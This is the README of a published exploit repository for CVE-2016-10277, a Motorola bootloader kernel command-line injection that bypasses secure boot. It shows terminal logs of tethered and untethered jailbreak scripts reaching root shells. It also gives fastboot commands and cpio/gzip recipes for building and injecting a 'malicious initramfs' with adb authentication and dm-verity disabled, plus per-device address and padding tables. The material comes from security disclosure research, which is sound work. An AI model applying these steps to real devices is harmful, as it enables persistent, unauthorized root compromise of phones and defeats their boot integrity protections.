# initroot: Motorola Bootloader Kernel Cmdline Injection Secure Boot & Device Locking Bypass (CVE-2016-10277) #

By Roee Hay / Aleph Research, HCL Technologies

## First stage exploit: Tethered jailbreak ##

This exploit gains an ephemeral unrestricted root access on the device.
For example, on `cedric` (some messages were removed for readability):

```terminal
$ cd ./tethered/cedric
$ ./initroot-tethered.sh
Welcome to initroot-cedric-tethered
...
(bootloader) <UTAG name="fsg-id" type="str" protected="false">
(bootloader)   <value>
(bootloader)     a initrd=0xA2100000,1588596
(bootloader)   </value>
(bootloader)   <description>
(bootloader)     FSG IDs, see http://goo.gl/gPmhU
(bootloader)   </description>
(bootloader) </UTAG>
OKAY [  0.015s]
finished. total time: 0.015s
target reported max download size of 536870912 bytes
sending 'aleph' (34319 KB)...
OKAY [  1.098s]
writing 'aleph'...
(bootloader) Invalid partition name aleph
FAILED (remote failure)
finished. total time: 1.101s
(bootloader) slot-count: not found
(bootloader) slot-suffixes: not found
(bootloader) slot-suffixes: not found
resuming boot...
OKAY [  0.006s]
finished. total time: 0.006s
uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3014(readproc) context=u:r:shell:s0
$ adb shell
cedric:/ # 

```

## Second stage exploit: Untethered jailbreak ##

This exploit gains a persistent root access on the device.
For example, on `athene` (some messages were removed for readabilitiy):

```terminal
$ cd ./untethered/athene

./initroot-untethered.sh 
Welcome to initroot-athene-untethered
Welcome to initroot-athene-tethered
...
(bootloader) <UTAG name="fsg-id" type="str" protected="false">
(bootloader)   <value>
(bootloader)     a initrd=0x92000000,2505052
(bootloader)   </value>
(bootloader)   <description>
(bootloader)     FSG IDs, see http://goo.gl/gPmhU
(bootloader)   </description>
(bootloader) </UTAG>

OKAY [  0.015s]
finished. total time: 0.015s
target reported max download size of 536870912 bytes
sending 'aleph' (35214 KB)...
OKAY [  1.131s]
writing 'aleph'...
(bootloader) Invalid partition name aleph
FAILED (remote failure)
finished. total time: 1.138s
(bootloader) slot-count: not found
(bootloader) slot-suffixes: not found
(bootloader) slot-suffixes: not found
resuming boot...
OKAY [  0.006s]
finished. total time: 0.006s
uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3014(readproc) context=u:r:kernel:s0
padC-initroot: 1 file pushed. 11.1 MB/s (22937600 bytes in 1.963s)
44800+0 records in
44800+0 records out
22937600 bytes transferred in 3.017 secs (7602784 bytes/sec)
...
(bootloader) <UTAG name="fsg-id" type="str" protected="false">
(bootloader)   <value>
(bootloader)     a rdinit= root=/dev/mmcblk0p41
(bootloader)   </value>
(bootloader)   <description>
(bootloader)     FSG IDs, see http://goo.gl/gPmhU
(bootloader)   </description>
(bootloader) </UTAG>

OKAY [  0.015s]
finished. total time: 0.015s
rebooting...

finished. total time: 0.815s
uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3014(readproc) context=u:r:kernel:s0
athene:/ # 

```

## Producing your own malicious initramfs archive ##

1. Use the commited `initroot-<device>.cpio.gz`, or produce your own:
```
$ cd <initramfs folder>
$ find . | grep -v [.]$ | cpio -R root:root -o -H newc | gzip > ../initroot-<device>.cpio.gz
OR if padding is needed:
$ dd if=/dev/zero of=../pad ibs=1 count=<PAD_SIZE>
$ cp ../pad ../initroot-<device>.cpio.gz && find . | grep -v [.]$ | cpio -R root:root -o -H newc | gzip > ../tmp && ls -la ../tmp && cat ../tmp >> ../initroot-<device>.cpio.gz  && rm -fr ../tmp
$ cd ..
```
2. Our commited initramfs images have adb running as root by default. It will not ask for authorization. In addition, dm-verity is disabled on the relevant partitions
```terminal
fastboot oem config fsg-id "a initrd=<SCRATCH_ADDR+PAD_SIZE>,<initroot.cpio.gz size-PAD_SIZE>"`
fastboot flash foo initroot-<device>.cpio.gz`
fastboot continue
```
3. if you use our initramfs, `adb shell` will now give you a root shell:
```
$ adb shell
shamu:/ # id
uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:su:s0
```

## Creating an Untethered exploit for other Moto devices ##

Read our [blog post](https://alephsecurity.com/2017/08/30/untethered-initroot/#persisting-the-payload)


## Verified Devices ##
| Device           | Codename | `SCRATCH_ADDR` | `PADDING`   | committed `initrams` | Unused Partition
|------------------|--------------|--------------|-----------|---------
| Nexus 6  | `shamu` | `0x11000000`   | `0x0`         | AOSP `userdebug` | `mmcblk0p11`
| Moto G5 (XT1676) | `cedric` | `0xA0100000`   | `0x2000000` | Release, patched `init` and `adbd` to disable SELinux, `set{u,g}id` to shell, capabilities drop and adb auth, etc | `mmcblk0p41`
| Moto G4 (XT1622) | `athene` | `0x90000000`   | `0x2000000` | "" | `mmcblk0p48`


## Community Reported ##
| Device           | Codename | `SCRATCH_ADDR` | Reporter | Description
|------------------|--------------|--------------|--------------|-----------
| Moto G5 Plus  | `potter` |  `0xA0100000` | [drbeat](https://github.com/drbeat)  | Injected boot property. [[proof](https://github.com/alephsecurity/initroot/issues/1)]
| Moto G4 Play (XT1607)  | `harpia` | `0x90000000` | [m-mullins](https://github.com/m-mullins)   | Full Exploitation of  Amazon XT1607. [[proof](https://github.com/m-mullins/InitRoot_Harpia)]
| Moto G4 Play (XT1609)  | `harpia` | `0x90000000` | [@utoprime](https://twitter.com/utoprime)   | Full Exploitation of Verizon XT1609. [[proof](https://twitter.com/utoprime/status/873941023050919936)]
| Moto G4 (XT1625) | `athene` | `0x90000000` | [@EWorcel](https://twitter.com/EWorcel) | Injected initrd that caused boot loops. [[proof](https://twitter.com/roeehay/status/868877672016957440)]  
| Moto G3 | `osprey` | `0x90000000` | [@asiekierka](https://twitter.com/asiekierka) | Injected initrd that caused boot loops. [[proof](https://twitter.com/asiekierka/status/873467107090075648)]
| Moto G2 (XT1072) | `thea` | `0x11000000`  | [@TheElix](https://disqus.com/by/TheElix/) | Injected initrd caused boot loops. [[proof](https://disqus.com/home/discussion/alephsecurity/initroot_hello_moto/#comment-3355705740)]
| Moto E (XT830C) | `condor_cdma` | `0x0E000000`  | [fetcher](https://disqus.com/by/disqus_U4zRE0u275/) | Full Exploitation of XT830C locked to Tracfone/Verizon with a 32MB padding [[proof](https://alephsecurity.com/2017/06/07/initroot-moto/#comment-3379229648)]
| Other | - | - | [@jcase](https://twitter.com/jcase) | [[proof](https://twitter.com/jcase/status/868930263782313984)]

## Note ##
This vulnerability may affect other Motorola devices too: a different initramfs will be needed. A different physical address of initrd (`SCRATCH_ADDR`). `PADDING` may vary as well.

## Video Demo ##

[![Video Demo of CVE-2016-10277](http://img.youtube.com/vi/dijRMpv4ktM/0.jpg)](https://www.youtube.com/watch?v=dijRMpv4ktM)

## Publications ##
1. [initroot: Bypassing Nexus 6 Secure Boot through Kernel Command-line Injection](https://alephsecurity.com/2017/05/23/nexus6-initroot/)
2. [initroot: Hello Moto](https://alephsecurity.com/2017/06/07/initroot-moto/)
3. [Motorola Android Bootloader Kernel Cmdline Injection Secure Boot Bypass](https://alephsecurity.com/vulns/aleph-2017011)
4. [Untethered initroot (USENIX WOOT '17)](https://alephsecurity.com/2017/08/30/untethered-initroot)
5. [USENIX WOOT '17 paper](https://www.usenix.org/conference/woot17/workshop-program/presentation/hay)


